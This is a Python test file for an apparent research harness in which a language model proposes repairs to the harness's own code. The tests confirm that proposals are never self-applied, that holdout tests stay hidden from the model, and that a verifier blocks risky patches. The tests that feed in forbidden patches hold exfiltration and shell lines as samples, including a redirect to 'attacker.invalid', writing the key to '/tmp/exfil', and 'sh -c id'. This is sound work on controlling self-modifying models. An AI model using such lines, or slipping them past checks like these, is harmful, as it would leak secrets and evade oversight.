"""Offline research protocol tests for BEAN's own model-authored self-repair.

No actual credentials, hosted models, or mutated production sources are used.
"""
from __future__ import annotations

import json
from io import BytesIO
from pathlib import Path
from urllib.error import HTTPError
from unittest.mock import patch

import pytest

from bean.evaluation import autonomous_selfrepair as lab

ORIGINAL = "def useful():\n    return 1\n"
EDIT = json.dumps({"edits": [{"find": "return 1", "replace": "return 2"}]})

class Reply:
    def __init__(self, code):
        self.code = code
    def __enter__(self):
        return self
    def __exit__(self, *_):
        return False
    def read(self, *_):
        return json.dumps({
            "model": "example/verified-free-route",
            "choices": [{"message": {"content": self.code},
                         "finish_reason": "stop"}],
        }).encode()


def setup(tmp_path):
    root = tmp_path / "baseline"
    path = root / lab.TARGET
    path.parent.mkdir(parents=True)
    path.write_text(ORIGINAL, encoding="utf-8")
    return root


def test_model_authored_repair_is_proposal_not_self_execute(tmp_path):
    root = setup(tmp_path)
    requests = []
    def fake(req, timeout):
        requests.append(json.loads(req.data))
        return Reply(EDIT)
    with patch.object(lab, "current_commit", return_value=lab.SOURCE_COMMIT):
        report = lab.generate(root=root, destination=tmp_path/"out",
                              key="fake-secret", request_fn=fake)
    assert report["status"] == "candidate_drafted_not_verified"
    assert len(report["attempts"]) == 1
    assert requests[0]["model"] == "openrouter/free"
    artifact = json.loads((tmp_path/"out"/"candidate.json").read_text())
    assert artifact["target"] == "bean/evaluation/bridge_peer_live_author.py"
    assert artifact["replacement"] == "def useful():\n    return 2\n"
    assert artifact["replacement_sha256"] == lab.sha(artifact["replacement"])
    assert (root / lab.TARGET).read_text() == ORIGINAL
    assert "fake-secret" not in json.dumps(report)


def test_two_bad_replies_then_own_model_fix_is_accepted(tmp_path):
    root = setup(tmp_path)
    answers = [Reply(None), Reply("not a patch"), Reply(EDIT)]
    with patch.object(lab, "current_commit", return_value=lab.SOURCE_COMMIT):
        report = lab.generate(root=root, destination=tmp_path/"out",
                              key="fake", request_fn=lambda *_ , **kw: answers.pop(0))
    assert report["status"] == "candidate_drafted_not_verified"
    assert [x["status"] for x in report["attempts"]] == [
        "model_candidate_rejected", "model_candidate_rejected",
        "source_candidate_drafted"
    ]


def test_only_invalid_responses_are_rejected_and_preserved(tmp_path):
    root = setup(tmp_path)
    with patch.object(lab, "current_commit", return_value=lab.SOURCE_COMMIT):
        report = lab.generate(root=root, destination=tmp_path/"out", key="fake",
                              request_fn=lambda *_ , **kw: Reply("no repair here"))
    assert report["status"] == "no_valid_candidate"
    assert len(report["attempts"]) == lab.MAX_CALLS
    assert not (tmp_path/"out"/"candidate.json").exists()
    assert (tmp_path/"out"/"author-receipt.json").exists()


def test_missing_key_does_not_create_any_candidate(tmp_path):
    root = setup(tmp_path)
    with patch.object(lab, "current_commit", return_value=lab.SOURCE_COMMIT):
        report = lab.generate(root=root, destination=tmp_path/"out", key="")
    assert report["status"] == "provider_unavailable"
    assert report["attempts"][0]["rejection"] == "OPENROUTER_KEY_NOT_CONFIGURED"
    assert not (tmp_path/"out"/"candidate.json").exists()


def test_http402_is_reported_without_paid_retry(tmp_path):
    root = setup(tmp_path)
    calls = []
    def reject(req, timeout):
        calls.append(req)
        raise HTTPError(req.full_url, 402, "payment required", None, BytesIO(b"private"))
    with patch.object(lab, "current_commit", return_value=lab.SOURCE_COMMIT):
        report = lab.generate(root=root, destination=tmp_path/"out", key="fake",
                              request_fn=reject)
    assert report["status"] == "provider_unavailable"
    assert len(calls) == 1
    assert "OPENROUTER_HTTP_402" in report["attempts"][0]["rejection"]


def test_source_commit_is_mandatory_and_author_cannot_touch_code(tmp_path):
    root = setup(tmp_path)
    with patch.object(lab, "current_commit", return_value="0"*40):
        report = lab.generate(root=root, destination=tmp_path/"out", key="fake",
                              request_fn=lambda *_ , **kw: Reply(EDIT))
    assert report["status"] == "source_integrity_failure"
    assert report["attempts"] == []
    assert (root/lab.TARGET).read_text() == ORIGINAL


def test_no_silent_source_change_on_bad_syntax(tmp_path):
    root = setup(tmp_path)
    bad_plan = json.dumps({"edits":[{"find":"return 1", "replace":"return ("}]})
    with patch.object(lab, "current_commit", return_value=lab.SOURCE_COMMIT):
        report = lab.generate(root=root, destination=tmp_path/"out", key="fake",
                              request_fn=lambda *_ , **kw: Reply(bad_plan))
    assert report["status"] == "no_valid_candidate"
    assert (root/lab.TARGET).read_text() == ORIGINAL
    assert not (tmp_path/"out"/"candidate.json").exists()


def test_model_sees_failures_and_source_but_not_holdout_tests():
    called = []
    def fake(req, timeout):
        called.append(json.loads(req.data))
        return Reply(EDIT)
    content, meta = lab.model_request("fake", ORIGINAL, None, request_fn=fake)
    sent = called[0]["messages"][0]["content"]
    assert "empty or oversized edit plan" in sent
    assert "def useful():" in sent
    assert "test_failed_model_reply_causes_substantively_different_retry_strategy" not in sent
    assert "bean/tests/test_autonomous_selfrepair_oracle.py" not in sent
    assert meta["model_served"] == "example/verified-free-route"

def test_ollama_fallback_on_free_provider_rate_limit(tmp_path):
    """A real neural fallback is invoked instead of ending at OpenRouter 429."""
    root = setup(tmp_path)
    called = []
    def hosted(req, timeout):
        raise HTTPError(req.full_url, 429, "quota", None, BytesIO(b""))
    def local(req, timeout):
        called.append(json.loads(req.data))
        return LocalReply(EDIT)
    with patch.object(lab, "current_commit", return_value=lab.SOURCE_COMMIT):
        result = lab.generate(
            root=root, destination=tmp_path / "out", key="fake",
            request_fn=hosted, local_request_fn=local, backend="auto")
    assert result["status"] == "candidate_drafted_not_verified"
    assert [x["provider"] for x in result["attempts"]] == ["openrouter", "ollama"]
    assert result["attempts"][0]["rejection"] == "OPENROUTER_HTTP_429"
    assert called[0]["model"] == "qwen2.5-coder:7b"
    assert called[0]["stream"] is False
    assert called[0]["format"]["properties"]["edits"]["minItems"] == 1
    assert "def useful()" in called[0]["messages"][0]["content"]
    assert "CURRENT PYTHON FUNCTION" in called[0]["messages"][0]["content"]
    candidate = json.loads((tmp_path / "out" / "candidate.json").read_text())
    assert candidate["provider_route"] == "ollama_local"
    assert candidate["replacement"] == ORIGINAL.replace("return 1", "return 2")
    assert (root / lab.TARGET).read_text() == ORIGINAL


class LocalReply:
    def __init__(self, value):
        self.value = value
    def __enter__(self):
        return self
    def __exit__(self, *_):
        return False
    def read(self, *_):
        return json.dumps({
            "model": "qwen2.5-coder:7b",
            "message": {"content": self.value},
            "done_reason": "stop",
        }).encode()


def test_local_neural_author_and_invalid_backend(tmp_path):
    root = setup(tmp_path)
    with patch.object(lab, "current_commit", return_value=lab.SOURCE_COMMIT):
        report = lab.generate(
            root=root, destination=tmp_path / "neural", key="",
            local_request_fn=lambda *_ , **kw: LocalReply(EDIT),
            backend="ollama")
    assert report["status"] == "candidate_drafted_not_verified"
    assert report["attempts"][0]["provider"] == "ollama"
    assert (tmp_path / "neural" / "candidate.json").is_file()
    with pytest.raises(ValueError, match="unsupported provider backend"):
        lab.generate(root=root, destination=tmp_path / "bad", key="", backend="paid")


def test_local_model_receipt_retains_rejected_source_excerpt(tmp_path):
    root = setup(tmp_path)
    def invalid(req, timeout):
        return LocalReply('{"edits":[]}')
    with patch.object(lab, "current_commit", return_value=lab.SOURCE_COMMIT):
        report = lab.generate(root=root, destination=tmp_path / "bad_neural",
                              key="", backend="ollama", local_request_fn=invalid)
    assert report["status"] == "no_valid_candidate"
    assert len(report["attempts"]) == lab.MAX_CALLS
    assert report["attempts"][0]["response_excerpt"] == '{"edits":[]}'
    assert not (tmp_path / "bad_neural" / "candidate.json").exists()


def test_provider_402_never_triggers_local_fallback(tmp_path):
    root = setup(tmp_path)
    called = []
    def paid(req, timeout):
        raise HTTPError(req.full_url, 402, "payment required", None, BytesIO(b""))
    def local(req, timeout):
        called.append(req)
        return LocalReply(EDIT)
    with patch.object(lab, "current_commit", return_value=lab.SOURCE_COMMIT):
        report = lab.generate(
            root=root, destination=tmp_path / "no_paid", key="fake",
            backend="auto", request_fn=paid, local_request_fn=local)
    assert report["status"] == "provider_unavailable"
    assert len(report["attempts"]) == 1
    assert not called

def test_selfrepair_scope_never_changes_provider_transport():
    from bean.evaluation.autonomous_selfrepair_verify import safe_transport_unchanged
    before = chr(10).join((
        "def call_model(key, source):",
        "    prompt = source",
        '    data = {"model": "openrouter/free", "prompt": prompt}',
        "    request = ('https://example.org', key, data)",
        "    return request",
        "",
    ))
    improved = before.replace("prompt = source", "prompt = source[:100]")
    assert safe_transport_unchanged(before, improved)
    tampered = before.replace("'https://example.org'", "'https://attacker.invalid'")
    with pytest.raises(ValueError, match="provider transport"):
        safe_transport_unchanged(before, tampered)
    injected = before.replace("prompt = source",
                              "prompt = source" + chr(10) + "    open('/tmp/exfil','w').write(key)")
    with pytest.raises(ValueError, match="file access"):
        safe_transport_unchanged(before, injected)

def test_rejected_neural_anchor_informs_next_model_attempt(tmp_path):
    root = setup(tmp_path)
    seen = []
    missing = json.dumps({"edits": [
        {"find": "def unrelated_fake_function(", "replace": "def unrelated_fake_function(x):"}
    ]})
    responses = [missing, EDIT]
    def local(req, timeout):
        data = json.loads(req.data)
        seen.append(data["messages"][0]["content"])
        return LocalReply(responses.pop(0))
    with patch.object(lab, "current_commit", return_value=lab.SOURCE_COMMIT):
        report = lab.generate(
            root=root, destination=tmp_path / "retry", key="",
            backend="ollama", local_request_fn=local)
    assert report["status"] == "candidate_drafted_not_verified"
    assert len(seen) == 2
    assert "def unrelated_fake_function(" in seen[1]
    assert "rejected find (not in source)" in seen[1]
    assert report["attempts"][0]["status"] == "model_candidate_rejected"
    assert report["attempts"][0]["rejected_find"] == "def unrelated_fake_function("


def test_neural_prompt_distinguishes_own_source_from_external_example():
    seen = []
    def mock(req, timeout):
        seen.append(json.loads(req.data)["messages"][0]["content"])
        return LocalReply(EDIT)
    lab.local_model_request(
        "def call_model(key, original):\\n    prompt = 'def calculate('\\n"
        "    return prompt\\n\\ndef save(path): pass\\n",
        None, request_fn=mock)
    assert "NOT a repair of the external ERP sample code" in seen[0]
    assert "def call_model(key, original)" in seen[0]

def test_model_patch_cannot_add_shell_or_secret_access():
    from bean.evaluation.autonomous_selfrepair_verify import safe_transport_unchanged
    before = chr(10).join((
        "def call_model(key, source):",
        "    prompt = source",
        '    data = {"model": "openrouter/free", "prompt": prompt}',
        "    request = ('https://example.org', key, data)",
        "    return request",
        "",
    ))
    for bad_statement in (
        "    subprocess.run(['sh', '-c', 'id'])",
        "    os.system('echo unsafe')",
        "    print(os.environ)",
        "    Request('https://attacker.invalid')",
        "    source = open('secrets').read()",
    ):
        candidate = before.replace(
            "    prompt = source",
            "    prompt = source" + chr(10) + bad_statement)
        with pytest.raises(ValueError, match="forbidden|dynamic execution"):
            safe_transport_unchanged(before, candidate)

def test_local_author_uses_real_python_function_not_decoy_text():
    messages = []
    def fake(req, timeout):
        messages.append(json.loads(req.data)["messages"][0]["content"])
        return LocalReply(EDIT)
    code = (
        "def call_model(key, original):\n"
        "    prompt = 'def calculate(' + original\n"
        "    if True:\n"
        "        prompt += 'repeated source'\n"
        "    return prompt\n"
        "\ndef save(path, value): pass\n"
    )
    lab.local_model_request(code, "rejected find (not in source): fake()",
                            request_fn=fake)
    assert "ACTUAL CALL_MODEL PYTHON FUNCTION" in messages[0]
    assert "prompt += 'repeated source'" in messages[0]
    assert "not from an error description" in messages[0]
    assert "fake()" in messages[0]


def test_ast_statement_ids_can_change_real_prompt_without_literal_anchors():
    base = (
        "def call_model(key, original, feedback=None):\n"
        "    import_lines = []\n"
        "    prompt = original\n"
        "    if feedback:\n"
        "        prompt += feedback\n"
        "    data = {'prompt': prompt}\n"
        "    return data\n"
    )
    result, changed = lab.apply_statement_plan(base, [
        {"target_id": "feedback",
         "replacement": "if feedback:\n    prompt = prompt[:75] + feedback"}
    ])
    assert "prompt = prompt[:75] + feedback" in result
    assert "data = {'prompt': prompt}" in result
    assert changed > 0
    assert "prompt" in lab.statement_targets(base)
    assert "feedback" in lab.statement_targets(base)
    assert "data" not in lab.statement_targets(base)


def test_ast_statement_ids_refuse_unknown_or_duplicate_targets():
    code = (
        "def call_model(key, original, feedback=None):\n"
        "    prompt = original\n"
        "    if feedback:\n"
        "        prompt += feedback\n"
        "    data = {'payload': prompt}\n"
        "    return data\n"
    )
    for edits in (
        [{"target_id": "data", "replacement": "data = {}"}],
        [{"target_id": "prompt", "replacement": "prompt = 'x'"},
         {"target_id": "prompt", "replacement": "prompt = 'y'"}],
        [{"target_id": "prompt", "replacement": "prompt = original", "extra": "bad"}],
    ):
        with pytest.raises(ValueError):
            lab.apply_statement_plan(code, edits)
    with pytest.raises(ValueError):
        lab.apply_model_response(code, json.dumps({
            "edits": [{"target_id": "prompt", "replacement": "prompt = None"}],
            "action": "write_file",
        }))


def test_real_local_model_schema_targets_stable_statement_ids():
    seen = []
    def mocked(req, timeout):
        body = json.loads(req.data)
        seen.append(body)
        return LocalReply(EDIT)
    code = (
        "def call_model(key, original, feedback=None):\n"
        "    prompt = original\n"
        "    if feedback:\n"
        "        prompt += feedback\n"
        "    data = {'prompt': prompt}\n"
        "    return data\n"
    )
    lab.local_model_request(code, None, request_fn=mocked)
    item = seen[0]["format"]["properties"]["edits"]["items"]
    assert set(item["properties"]["target_id"]["enum"]) == {"feedback"}
    assert "STATEMENT_ID=prompt" not in seen[0]["messages"][0]["content"]
    assert "STATEMENT_ID=feedback" in seen[0]["messages"][0]["content"]


def test_generated_statement_edit_is_really_applied_not_preselected(tmp_path):
    code = (
        "def call_model(key, original, feedback=None):\n"
        "    prompt = original\n"
        "    if feedback:\n"
        "        prompt += feedback\n"
        "    data = {'prompt': prompt}\n"
        "    return data\n"
    )
    reply = json.dumps({"edits": [
        {"target_id": "feedback",
         "replacement": "if feedback:\n    prompt = prompt[:200] + feedback"}
    ]})
    root = tmp_path / "baseline"
    source = root / lab.TARGET
    source.parent.mkdir(parents=True)
    source.write_text(code, encoding="utf-8")
    with patch.object(lab, "current_commit", return_value=lab.SOURCE_COMMIT):
        report = lab.generate(root=root, destination=tmp_path / "output",
                              key="", backend="ollama",
                              local_request_fn=lambda *_args, **_kwargs: LocalReply(reply))
    assert report["status"] == "candidate_drafted_not_verified"
    candidate = json.loads((tmp_path / "output" / "candidate.json").read_text())
    assert "prompt[:200]" in candidate["replacement"]
    assert candidate["replacement_sha256"] == lab.sha(candidate["replacement"])


def test_retry_repair_model_is_focused_on_feedback_branch():
    seen = []
    def fake(req, timeout):
        seen.append(json.loads(req.data))
        return LocalReply(EDIT)
    code = (
        "def call_model(key, original, feedback=None):\n"
        "    prompt = original\n"
        "    if feedback:\n"
        "        prompt += feedback\n"
        "    data = {'prompt': prompt}\n"
        "    return data\n"
    )
    lab.local_model_request(code, "invalid source edit", request_fn=fake)
    body = seen[0]
    content = body["messages"][0]["content"]
    assert "Preserve the initial" in content
    assert "feedback-handling block" in content
    assert "STATEMENT_ID=feedback" in content
    assert "STATEMENT_ID=prompt" not in content
    assert body["format"]["properties"]["edits"]["items"]["properties"]["target_id"]["enum"] == ["feedback"]
